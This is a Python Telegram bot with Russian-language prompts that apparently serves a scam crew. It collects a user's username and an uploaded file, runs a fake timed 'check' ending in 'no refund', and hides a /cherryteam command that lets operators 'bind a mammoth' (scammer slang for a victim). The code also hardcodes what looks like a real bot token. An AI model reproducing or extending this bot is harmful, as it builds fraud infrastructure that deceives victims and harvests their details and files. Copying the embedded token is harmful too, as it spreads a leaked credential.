import os
import time
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, CallbackQueryHandler, CallbackContext, Filters

print("=== БОТ СТАРТУЕТ ===")

BOT_TOKEN = "8092588180:AAGJR1QrIqLgWBmZNxHEqb9f-Ou3YqLts7U"
GROUP_CHAT_ID = "4866741254"

users_db = {}
mammoths_db = {} 
messages_db = {}

def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    users_db[user_id] = {"username": update.effective_user.username or "", "step": "need_username"}
    
    if user_id not in messages_db:
        messages_db[user_id] = []
    messages_db[user_id].append({"text": "/start", "time": datetime.now()})
    
    update.message.reply_text("Привет! Отправь username без @")

def handle_text(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    text = update.message.text
    
    if user_id not in messages_db:
        messages_db[user_id] = []
    messages_db[user_id].append({"text": text, "time": datetime.now()})
    
    if user_id in users_db and users_db[user_id].get("step") == "need_username":
        users_db[user_id]["username"] = text
        users_db[user_id]["step"] = "need_file"
        update.message.reply_text("✅ Username принят! Теперь файл.")

def handle_file(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in users_db and users_db[user_id].get("step") == "need_file":
        update.message.reply_text("Файл получен! Проверка...")
        time.sleep(4)
        update.message.reply_text("✅ Проверка завершена! Рефаунда нет.")
        users_db[user_id]["step"] = "done"

def cherryteam(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("ПРИВЯЗАТЬ МАМОНТА 🦣", callback_data="bind_mammoth")],
        [InlineKeyboardButton("МОИ МАМОНТЫ", callback_data="my_mammoths")]
    ]
    markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text("Добро в TDTTEAM! Цепляй мамонта.", reply_markup=markup)

def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    
    if query.data == "bind_mammoth":
        user_id = query.from_user.id
        if user_id not in users_db:
            users_db[user_id] = {}
        users_db[user_id]["step"] = "awaiting_mammoth"
        query.edit_message_text("Отправь username или ID мамонта")
        
    elif query.data == "my_mammoths":
        query.edit_message_text("Пока мамонтов нет")

def main():
    print("🚀 ИНИЦИАЛИЗАЦИЯ...")
    
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("cherryteam", cherryteam))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_text))
    dp.add_handler(MessageHandler(Filters.document, handle_file))
    dp.add_handler(CallbackQueryHandler(button_handler))
    
    print("✅ БОТ ЗАПУЩЕН!")
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
